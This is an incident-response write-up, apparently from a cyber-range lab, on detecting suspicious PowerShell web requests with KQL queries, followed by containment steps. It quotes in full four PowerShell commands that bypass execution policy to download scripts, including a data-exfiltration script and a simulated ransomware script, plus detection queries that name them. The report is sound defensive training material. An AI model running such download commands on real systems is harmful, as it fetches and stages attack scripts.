# 🔍 Incident Response Analysis: Identifying Suspicious PowerShell Web Requests

![image](https://github.com/user-attachments/assets/2edf7e2d-294f-4ea4-a8a8-11fefded19ad)

## 🕒 Timeline and Findings

### 📌 Alert Rule Creation
An alert rule was created using the following query to detect suspicious PowerShell activity on **windows-target-1**:

```kusto
let TargetDevice = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe" and InitiatingProcessCommandLine contains "Invoke-WebRequest"
```

---

## 🔍 Detection and Analysis

### 📢 Incident Overview
During the investigation of the **ARJ - PowerShell Suspicious Web Request** incident, it was discovered that PowerShell commands were executed on **windows-target-1**, leading to the download of multiple scripts.

**Incident Breakdown:**
- **Affected Device:** 1 (`windows-target-1`)
- **Affected User:** 1
- **Downloaded Scripts:** 4
- **Execution Method:** PowerShell commands

### 🖥️ Powershell Commands Observed
The following PowerShell commands were executed on the affected machine:

```powershell
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
```

### 🗣️ User Interaction
The affected user was contacted regarding their activity around the time of the suspicious logs.  
They stated that they attempted to install a **free** piece of software, saw a **black screen** for a few seconds, and then "nothing happened."

---

## 📊 Execution Confirmation

Using **Microsoft Defender for Endpoint (MDE)** and **Sentinel**, it was confirmed that the downloaded scripts were actually executed. The following query was used:

```kusto
let TargetHostname = "windows-target-1"; // Replace with the name of your VM as it appears in logs
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add script names
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize TimeRan = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

---

## 🛠️ Reverse Engineering Analysis

The scripts were forwarded to the **malware reverse engineering team** for analysis. Findings:

| Script Name          | Functionality |
|----------------------|--------------|
| `portscan.ps1`      | Scans an IP range for open ports and logs results. |
| `exfiltratedata.ps1`| Generates fake employee data, compresses it, and uploads it to Azure Blob Storage. |
| `eicar.ps1`         | Creates an **EICAR** test file to trigger antivirus detection. |
| `pwncrypt.ps1`      | Encrypts fake company data and drops a ransom note with decryption instructions. |

---

## 🚑 Containment, Eradication, and Recovery

### 🛡️ Immediate Actions Taken
1. **Isolated the affected machine** in **Microsoft Defender for Endpoint (MDE)**.
2. **Ran a full anti-malware scan** on the system.
3. **Verified system integrity** after cleaning and removed isolation.

---

## 📈 Post-Incident Activities

### 📌 Security Enhancements Implemented:
✅ **User Awareness Training**
   - Affected user was enrolled in an **advanced cybersecurity training program**.
   - Upgraded the organization's security awareness training package via **KnowBe4**.
   - Increased training frequency.

✅ **PowerShell Restriction Policy**
   - Implemented a policy restricting **PowerShell execution** for non-essential users.

✅ **Monitoring Improvements**
   - Enhanced monitoring rules to **detect and alert** on PowerShell execution with `Invoke-WebRequest`.

---

## 🎯 Conclusion
The incident was successfully mitigated, and no sensitive company data was compromised.  
However, it highlighted gaps in **user awareness and PowerShell execution policies**, which have now been addressed.

---

📌 **Next Steps**
- Conduct a **red team simulation** to assess the effectiveness of new security controls.
- Continue monitoring for any similar PowerShell-based threats.
- Reinforce **endpoint protection policies** to prevent unauthorized script execution.

---

🔒 **Cybersecurity Team Response Log**  
*Prepared by: Rasheed Jimoh*  
*Date: 25 February 2025*  
*Organization: RJInnovateHub*  
